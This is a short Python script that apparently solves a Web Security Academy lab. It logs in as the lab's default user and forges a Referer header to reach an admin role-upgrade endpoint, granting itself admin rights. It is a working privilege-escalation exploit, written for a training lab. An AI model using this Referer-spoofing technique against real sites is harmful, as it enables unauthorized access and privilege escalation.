import requests, re
from bs4 import BeautifulSoup

s = requests.Session()

site = 'acb01fc31e19e5fac0cadd18001500be.web-security-academy.net'
url = f'https://{site}'
admin_url = f'{url}/admin'

login_data = {
    'username' : 'wiener',
    'password' : 'peter'
}


resp = s.post(f'{url}/login', login_data)

resp = s.get(f'{url}/admin-roles?username=wiener&action=upgrade',headers={'referer' : admin_url})
print(resp.text)

